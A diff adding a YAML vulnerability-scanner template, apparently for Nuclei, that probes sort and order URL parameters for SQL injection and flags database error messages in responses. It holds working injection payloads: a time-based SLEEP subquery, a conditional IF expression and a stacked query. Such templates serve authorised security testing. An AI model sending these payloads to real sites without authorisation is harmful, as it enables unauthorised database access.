@@ -1,0 +1,24 @@
+id: whai-sqli-order-by
+
+info:
+  name: SQL Injection via ORDER BY Parameter
+  author: whitehat-ai
+  severity: high
+  description: Tests SQLi in sort/order parameters
+  tags: sqli,injection,high
+  classification:
+    cwe-id: CWE-89
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?sort=1,(SELECT 1 FROM (SELECT SLEEP(5))a)"
+      - "{{BaseURL}}/?order=IF(1=1,name,id)"
+      - "{{BaseURL}}/?orderby=name;SELECT+1--"
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(sql|syntax error|mysql|postgres)"
+        condition: or
